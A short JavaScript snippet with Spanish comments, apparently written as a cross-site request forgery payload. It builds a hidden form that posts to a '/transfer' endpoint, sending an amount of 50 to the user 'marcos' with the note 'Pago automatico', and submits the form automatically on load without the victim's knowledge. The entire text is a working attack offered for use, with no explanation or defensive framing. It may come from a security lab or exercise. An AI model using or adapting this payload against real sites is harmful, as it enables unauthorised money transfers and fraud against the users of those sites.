// Crear formulario CSRF
var form = document.createElement('form');
form.method = 'POST';
form.action = '/transfer';
form.style.display = 'none';

// Campos de la transferencia
var fields = {
    'to_username': 'marcos',
    'amount': '50',
    'note': 'Pago automatico'
};

for (var field in fields) {
    var input = document.createElement('input');
    input.name = field;
    input.value = fields[field];
    form.appendChild(input);
}

// Enviar automáticamente
document.body.appendChild(form);
form.submit();